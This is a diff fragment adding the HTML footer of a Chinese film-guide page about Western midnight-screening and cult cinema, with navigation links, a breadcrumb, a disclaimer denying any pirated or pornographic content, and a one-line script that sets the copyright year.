+        <div style="margin-top:6px">午夜场观影导航 · Cult / 独立 / 类型片片单 · 影史纪年 · 观影礼仪</div>
+      </div>
+      <div class="fn">
+        <a href="#zap">亚类型换台</a>
+        <a href="#age">影史纪年</a>
+        <a href="#list">必看清单</a>
+        <a href="#cmp">选片对照</a>
+        <a href="#faq">问答</a>
+        <a href="#" rel="nofollow">投稿片单</a>
+        <a href="#" rel="nofollow">版权声明</a>
+      </div>
+    </div>
+    <nav class="bread">
+      当前位置：<a href="https://oumeiwuyedianyingwang-cn.github.io/">首页</a> / <span>欧美午夜电影网 · 午夜场观影导航</span>
+    </nav>
+    <p class="copy">
+      内容声明：本页为电影鉴赏、影史研究、观影指引类导航索引，所涉影片名称、年份、导演、获奖、分级信息仅作介绍、评论、研究与讨论之用，<b style="color:var(--amber)">不构成任何资源提供，亦不托管、不链接至侵权或色情内容</b>。本站所称"午夜电影"指 1970 年代起源于欧美影院的午夜场次放映传统及其影史脉络，属电影学术与评论范畴，与色情内容无任何关联；"必看清单""亚类型""影史纪年""选片对照"等均为编辑部主观整理，仅供参考，欢迎指正。请遵守所在地法律法规，通过合法合规的正版渠道观看影视作品，尊重创作者的劳动与知识产权。© <span id="yr">2026</span> oumeiwuyedianyingwang-cn.github.io · All rights reserved.
+    </p>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
